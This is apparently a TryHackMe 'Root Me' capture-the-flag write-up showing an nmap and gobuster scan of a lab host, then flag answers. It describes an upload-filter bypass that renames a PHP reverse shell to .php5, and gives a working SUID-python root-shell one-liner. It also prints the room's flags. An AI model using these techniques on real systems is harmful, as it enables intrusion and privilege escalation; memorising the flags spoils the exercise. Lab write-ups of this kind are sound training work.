# Root Me

## Reconnaissance

```
# Nmap 7.80 scan initiated Mon Apr  5 21:56:59 2021 as: nmap -sC -sV -vv -oN nmap_scan 10.10.203.168
Nmap scan report for 10.10.203.168
Host is up, received syn-ack (0.054s latency).
Scanned at 2021-04-05 21:56:59 BST for 12s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  5 21:57:11 2021 -- 1 IP address (1 host up) scanned in 12.61 seconds
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.203.168/
[+] Threads      : 50
[+] Wordlist     : /opt/wordlist/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
=====================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
=====================================================
=====================================================

```
**Questions**

    1. Scan the machine, how many ports are open?

2

    2. What version of Apache is running?

2.4.29

    3. What service is running on port 22?

SSH

Find directories using gobuster

    4. What is the hidden directory?

/panel

## Getting A Shell

    1. Find a form to upload and get a reverse shell, and find the flag.

THM{y0u_g0t_a_sh3ll}

Uploading the php reverse shell and changing the extension to be a `.php5` extension allowed me to get a listener back. Searching the system for the flag with `find / -type f -name user.txt 2>/dev/null` found the flag located at `/vat/www/user.txt`.

## Privilege Escalation

    1. Search for files with SUID permission, which file is weird?

`/usr/bin/python`

Find a form to escalate your privileges.

GTFOBins contains a python SUID entry. In order to gain a root shell run the command `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

    2. root.txt?

THM{pr1v1l3g3_3sc4l4t10n}

`find / -type f -name root.txt` - located at /root/root.txt